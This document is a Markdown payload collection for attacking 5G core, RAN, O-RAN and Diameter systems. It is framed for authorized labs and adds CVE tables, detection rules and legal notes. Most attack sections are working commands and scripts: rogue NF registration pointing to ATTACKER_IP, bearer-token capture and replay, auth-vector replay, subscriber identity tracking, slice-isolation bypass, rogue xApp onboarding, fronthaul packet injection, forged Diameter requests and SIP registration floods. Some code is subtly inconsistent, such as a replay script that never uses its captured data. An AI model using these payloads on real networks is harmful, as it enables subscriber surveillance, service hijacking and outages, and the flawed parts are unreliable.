# Payloads — 5g-6g-telecom-attack-advanced

> Attack payloads for 5g-6g-telecom-attack-advanced.
> Scope: 5G Core (SBA), SUPI/SUCI, pseudo-gNB techniques, O-RAN, network slicing, Diameter/SBI advanced scenarios, and 6G research vectors. Legacy 2G-4G/SS7/basic IMSI-catcher coverage lives in `5g-telecom-attack`.
> All radio/core testing assumes an authorized lab (srsRAN + Open5GS/Free5GC) or a written engagement scope covering RAN and core elements.

---

## Index

1. [Authorized Lab Foundation](#1-authorized-lab-foundation)
2. [5G Core SBA — Rogue NF & NRF Attacks](#2-5g-core-sba--rogue-nf--nrf-attacks)
3. [5G Core SBA — SBI JWT Forging & Relay](#3-5g-core-sba--sbi-jwt-forging--relay)
4. [5G Core SBA — AUSF/UDM Auth Bypass (AV Replay)](#4-5g-core-sba--ausfudm-auth-bypass-av-replay)
5. [SUPI/SUCI — De-masking & Identity Tracking](#5-supisuci--de-masking--identity-tracking)
6. [Pseudo-gNB — Forced Fallback & 5G Paging Leak](#6-pseudo-gnb--forced-fallback--5g-paging-leak)
7. [Network Slice Attacks](#7-network-slice-attacks)
8. [Open RAN — RIC, O1, and Fronthaul](#8-open-ran--ric-o1-and-fronthaul)
9. [Diameter/SBI Advanced Scenarios](#9-diametersbi-advanced-scenarios)
10. [NAS/RRC Fuzzing](#10-nasrrc-fuzzing)
11. [Known 5G CVEs (NVD-verified)](#11-known-5g-cves-nvd-verified)
12. [Detection Engineering (5G Core)](#12-detection-engineering-5g-core)
13. [6G Research Vectors](#13-6g-research-vectors)
14. [Reporting & Legal Boundaries](#14-reporting--legal-boundaries)

---

## 1. Authorized Lab Foundation

The reproducible baseline for every payload below.

```bash
# Core: Open5GS (all-in-one)
sudo apt install open5gs
sudo systemctl start open5gs-nrfd open5gs-amfd open5gs-smfd open5gs-upfd open5gs-ausfd open5gs-udmd
# WebUI default: http://<host>:3000  (see CVE section — default credentials class)

# RAN + UE simulator: srsRAN with AMF binding
sudo apt install srsran   # or build from source for 2026 releases
sudo srsran-gnb --config ./lab/gnb_zmq.conf &      # virtual radio
sudo srsran-ue --zte &                              # virtual UE, registers with core

# Verify registration end-to-end
sudo ./open5gs/build/tests/registration/registration | tail -5
```

Lab-only rules: SUCI null-scheme, unencrypted fronthaul, and default passwords are all fair game here precisely because production is (supposed to be) hardened — the lab proves the attack classes.

---

## 2. 5G Core SBA — Rogue NF & NRF Attacks

The Network Repository Function (NRF) is the service-discovery heart of SBA. A rogue NF that manages to register gains the ability to be discovered by every other NF.

```bash
# Discover the NRF API surface (lab: usually http://127.0.0.10:7777/nnrf-disc/v1)
curl -s http://NRF:7777/nnrf-nfm/v1/nf-instances | jq '.[].nfType'

# Register a rogue NF (here: pretend AMF) — succeeds when the NRF skips OAuth2 on
# the northbound registration API (common lab misconfiguration, seen in the wild)
curl -s -X POST http://NRF:7777/nnrf-nfm/v1/nf-instances \
  -H "Content-Type: application/json" \
  -d @rogue-nf.json <<'EOF'
{
  "nfInstanceId": "0f2b1c3d-rogue-4e5f-9a01-attackerc0de",
  "nfType": "AMF",
  "nfStatus": "REGISTERED",
  "ipv4Addresses": ["ATTACKER_IP"],
  "amfInfo": {"amfSetId": "1", "amfPointer": "01"}
}
EOF

# After registration, every NF asking the NRF for an AMF can be pointed at you
curl -s "http://NRF:7777/nnrf-disc/v1/nf-instances?target-nf-type=AMF&requester-nf-type=SMF"
```

Attack surface checklist: NRF registration without mTLS client cert, OAuth2 (`OAuth 2.0` claim missing from NF Profile), heartbeat spoofing to keep a dead NF "alive" in discovery.

---

## 3. 5G Core SBA — SBI JWT Forging & Relay

```bash
# Grab a service token issued to a legitimate NF (on-path position required)
sudo tcpdump -i any -w sbi.pcap 'tcp port 7777 or tcp port 8080'
tshark -r sbi.pcap -Y http.authorization -T fields -e http.authorization | sort -u

# Relay: replay the captured bearer token from your own position
curl -s http://AMF:8080/namf-comm/v1/ue-contexts \
  -H "Authorization: Bearer $CAPTURED_JWT"

# Forging: decode the JWT, look for 'alg: none' or weak HMAC secrets in lab cores
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
# If alg=none accepted (lab cores have shipped this), strip the signature and reissue
```

Detection tell (defender side, §12): same `sub`/`nfInstanceId` claim used from a new source IP within token lifetime.

---

## 4. 5G Core SBA — AUSF/UDM Auth Bypass (AV Replay)

5G-AKA sends the Authentication Vector from UDM/ARPF to AUSF to SEAF. Replay windows exist when sequence-number (SQN) synchronization is mishandled.

```python
#!/usr/bin/env python3
# av_replay.py — replay a captured 5G-AKA auth challenge toward another SEAF/AMF
# (lab: Open5GS + srsRAN; on-path capture of namf-auth exchanges required)
import requests, json

CAPTURED_AUTH = {  # from tcpdump of nnrf-dis -> nausf-auth traffic
  "5gAka": {"rand": "00"*16, "autn": "00"*16, "hxresStar": "00"*32}
}
r = requests.post(
    "http://AMF:8080/nausf-auth/v1/ue-authentications",
    json={"supiOrSuci": "suci-0-001-01-0000-0-0-0000000001", "servingNetworkName": "5G:mnc001.mcc001.3gppnetwork.org"},
    timeout=5)
print(r.status_code, r.json().get("authType"), "→ compare with captured AUTN for SQN drift")
```

What to report: whether MAC-failure vs SYNCH-failure handling lets an old AV be re-fed (UDM must reject with SYNCH failure and resync, never accept a stale AV).

---

## 5. SUPI/SUCI — De-masking & Identity Tracking

```bash
# SUCI null-scheme check: if the operator provisioned ECIES null-scheme (scheme 0),
# the "concealed" IMSI is transmitted in cleartext on the radio path
# Capture NAS registration via the lab gNB and inspect the SUCI IE:
sudo srsran-gnb --pcap enabled --pcap-nas enabled
tshark -r gnb_nas.pcap -Y nas_5gs.msg.type==0x41 -V 2>/dev/null | grep -A2 "SUCI"

# suci-0-... means null scheme (plaintext IMSI follows); suci-1-... is real ECIES
```

GUTI tracking (post-auth identity): log TMSI/GUTI reallocations across captures of the same handset — persistent tracking across "pseudonym" rotation defeats the privacy goal.

```bash
# Correlate GUTIs across two captures of the same device
tshark -r cap1.pcap -Y gmm.ext_ident -T fields -e gmm.guti > g1
tshark -r cap2.pcap -Y gmm.ext_ident -T fields -e gmm.guti > g2
join g1 g2 | head   # same UE reallocation chain = tracking proof
```

---

## 6. Pseudo-gNB — Forced Fallback & 5G Paging Leak

```bash
# Advertise a 5G-capable gNB with degraded capability / no NSA anchor,
# forcing the UE to camp on 4G where IMSI may still be exposed
sudo srsran-gnb --config ./fallback.conf

# Config essentials (fallback.conf):
# [enb] enable_d256 = false; nr_cell_list = ({rf_port=0, ...})
# Higher power + higher priority PLMN broadcast wins cell selection
```

5G paging leak class: some early deployments fall back to IMSI-based paging on N2 in failure modes (S-TMSI exhaustion, miscoded paging identities) — capture N2 paging toward the AMF and grep for the IMSI pattern where only S-TMSI/GUTI should appear.

---

## 7. Network Slice Attacks

```python
#!/usr/bin/env python3
# slice_escape.py — request service on a slice the UE is not subscribed to
import requests

# 1) Craft N1 NAS with forged S-NSSAI (lab UE with SIM provisioned for eMBB only)
#    SST=1 (eMBE) -> claim SST=2 (URLLC) or an operator/stealing slice
# via srsRAN UE: patch the NAS registration container:
#   build/tests/nas/../construct_registration.py --ssts 2,0xFFFFFF

# 2) At the core, probe cross-slice access on SBI (SMF selection bypass)
r = requests.post("http://SMF:8080/nsmf-pdusession/v1/sm-contexts",
    headers={"3gpp-S-Nssai": "{\"sst\": 2, \"sd\": \"FFFFFF\"}"},
    json={"supi": "imsi-001001234567890", "dnn": "urllc-lab"},
    timeout=5)
print("slice-bypass verdict:", r.status_code, r.text[:200])
# 403 = enforced; 201 = slice isolation failure (finding)
```

Also test: inter-slice resource-policy abuse (URLLC-priority traffic marked into an eMBB PDU session via QoS-rule manipulation).

---

## 8. Open RAN — RIC, O1, and Fronthaul

```bash
# RIC xApp/RtMgr surface: near-real-time RIC exposes E2/RMR + xApp APIs
nmap -p 4560,4561,8080,3801 RIC_HOST        # RMR (4560/4561), xApp HTTP
# Inject a rogue xApp when the RIC's onboarding API lacks auth (lab: O-RAN SC GOLD)
curl -s -X POST http://RIC:8080/onboard/api/v1/onboard \
  -H "Content-Type: application/json" -d @rogue-xapp.json

# O1 (NETCONF/YANG + REST) misconfiguration probing
curl -s --netrc-file=./netconf.creds http://O1:8183/restconf/data/netconf-state
sshpass -p <creds> ssh -p 830 admin@O1 -s netconf  # brute paths only in authorized scope
```

Fronthaul abuse (retain + harden the original payload):

```bash
# If fronthaul is unencrypted (common in early O-RAN deployments),
# replay/inject eCPRI packets
tcprewrite --dlnat=FRONTHAUL_IP --enet-dmac=00:11:22:33:44:55 \
           --infile=legit.pcap --outfile=inject.pcap
tcpreplay --intf=eth1 inject.pcap
```

---

## 9. Diameter/SBI Advanced Scenarios

```python
from scapy.all import *

# Craft Diameter ULR (Update Location Request) — the original classic, extended:
diam_pkt = Diameter(
    avp_session_id="attacker",
    avp_auth_session_state=1,
    avp_origin_host="rogue.mme.attacker.com",
    avp_destination_realm="epc.mnc.mcc.3gppnetwork.org",
    avp_user_name="IMSI_001001234567890",
)
send(IP(dst="SGSN_IP")/SCTP()/diam_pkt)
```

```bash
# pycrate-based scenario battery (roaming/interconnect testing in authorized scope)
python3 -m pycrate_diameter scenarios/ulr_sar_purge.py --target DIAM_RELAY

# sipp-driven registration storms against the S-CSCF equivalent (lab IMS)
sipp -sf reg_flood.xml -r 50 -l 200 -m 10000 -i ATTACKER_IP SIP_PROXY:5060
```

---

## 10. NAS/RRC Fuzzing

```bash
# Fuzz the gNB's RRC parser via the virtual-radio interface (lab)
sudo srsran-gnb --config ./lab/gnb_zmq.conf &
python3 fuzz/rrc_mutate.py --iface ZMQ --seed corpus/rrc_setup_req.bin --iters 100000

# Watch for: crash in gNB, AMF-side 5GMM protocol errors, RRC reestablish storms
journalctl -u open5gs-amfd -f | grep -iE "decode|error|reset"
```

Corpus sources: recorded lab NAS/RRC PCAPs; 3GPP TS 38.331/24.501 message templates.

---

## 11. Known 5G CVEs (NVD-verified)

All IDs verified against the NVD API on 2026-09-05 before inclusion.

### Open5GS (lab-core attack surface)

| CVE | Component | Class | Exploitation note |
|-----|-----------|-------|-------------------|
| CVE-2021-25863 | Open5GS 2.1.3 WebUI | Default credentials | WebUI binds `0.0.0.0:3000`, admin password `1423`; subscriber takeover |
| CVE-2021-44081 | Open5GS 2.1.4 AMF | Buffer overflow | MSIN length overflow in AMF — crafted registration crashes the core |
| CVE-2021-41794 | Open5GS ≤ 2.3.3 | Parser trust | `ogs_fqdn_parse` trusts client-supplied length — crafted FQDN AVP |
| CVE-2021-45462 | Open5GS 2.4.0 | DoS | Crafted packet from UE crashes SGW-U/UPF (user-plane outage) |

### Baseband (UE-side attack surface)

| CVE | Component | Class | Exploitation note |
|-----|-----------|-------|-------------------|
| CVE-2023-26075 | Exynos modems (850/1080/etc.) | Baseband memory corruption | Pre-auth modem parsing bugs — silent SMS / radio-path RCE class |
| CVE-2023-26072 | Exynos modems | Baseband memory corruption | Same advisory family; pair with firmware diffing |
| CVE-2023-26074 | Exynos VoLTE/RCS stack | VoLTE component flaw | Exposes UE-side VoIP handling to network-originated attacks |

Advisory-grounded extras (no consolidated ID — describe, don't cite): lab misconfig classes above (NRF without OAuth2, null-scheme SUCI, unencrypted fronthaul) are finding categories, not CVEs.

---

## 12. Detection Engineering (5G Core)

```yaml
# Sigma-style: rogue NF registration (no client cert, unknown nfInstanceId)
title: 5G NRF registration from unattested NF
logsource: { category: network, service: nrf }
detection:
  selection:
    event: 'nnrf-nfm:register'
    nf_instance_known: false
    mtls_client_cert: false
  condition: selection
```

```spl
# Splunk: SBI token reuse from new source (JWT replay)
index=sbi sourcetype=open5gs:http
| stats values(src_ip) as srcs dc(src_ip) as n by jwt_sub
| where n > 1 AND min(_time) < relative_time(now(), "-5m")
```

Also alert on: SYNCH-failure bursts (AV replay attempts), SUCI scheme=0 on production N2, cross-S-NSSAI 403→201 changes, eCPRI flows on non-fronthaul VLANs.

---

## 13. 6G Research Vectors

- **THz beam eavesdropping**: narrow beams still leak via sidelobes and rough-surface scatter; lab repro with 140 GHz band front-ends — measure interception envelope vs beamforming codebook
- **AI-native air interface adversarial samples**: perturb CSI/reference signals to flip learned demod/beam-selection models (adversarial ML × PHY)
- **RIS (reconfigurable intelligent surface) hijack**: a $50 reflector array redirecting coverage — physical-layer MITM analog
- **Joint communication-and-sensing (JCIS) abuse**: leaked sensing data (presence/heartbeat radar) as a privacy side channel

Each is a research vector for report "future considerations" sections, not a field-ready payload.

---

## 14. Reporting & Legal Boundaries

- Radio transmissions (pseudo-gNB, jamming-adjacent fallback tests) are licensed-spectrum activities — lab RF cages or shields mandatory; unlicensed transmission violates telecom law in nearly every jurisdiction
- Core-side SBI/Diameter testing stays inside the written IP ranges of the engagement; roaming-partner systems are almost always out of scope
- Report template skeleton: lab topology → attack class → evidence (PCAP + logs) → detection mapping (§12) → remediation priority

---

## MITRE ATT&CK Mapping + Reference Expansion (v0.3.1)

### ATT&CK Mapping (expansion)

| ATT&CK Technique | Skill Activity | Detection Hint |
|------------------|----------------|-----------------|
| **T1557 — Adversary-in-the-Middle** | Pseudo-gNB forced fallback; SBI token relay | Core: unexpected N2 peers; same JWT from new IP |
| **T1595 — Active Scanning** | NRF/SBI/O1 surface enumeration | API gateway: probe patterns |
| **T1498 — Network Denial of Service** | NAS fuzz crashes; paging storms | AMF: decode-error bursts |
| **T1621 — MFA Request Generation** | 5G-AKA AV replay push (auth-fatigue analog) | UDM: SYNCH-failure bursts |
| **T1046 — Network Service Scanning** | RIC/O1/fronthaul port mapping | NAC: scan fan-out on management VLANs |
| **T1078 — Valid Accounts** | WebUI default credentials (CVE-2021-25863) | SIEM: first-use admin login geo |

### Reference Expansion (F-5G6G-002, v0.2.7)

- [3GPP release specifications (SA3 security)](https://www.3gpp.org)
- [GSMA security guidelines (FS.31/FS.40 series)](https://www.gsma.com)
- [O-RAN Alliance security specs](https://www.o-ran.org)
- [Open5GS open-source 5G core for lab testing](https://open5gs.org)
- [srsRAN open-source RAN stack](https://www.srsran.com)
- [ETSI security standards incl. NFV/5G](https://www.etsi.org)
- [3GPP TS 33.501 (5G security architecture)](https://www.3gpp.org)
- [O-RAN Software Community](https://o-ran-sc.org)
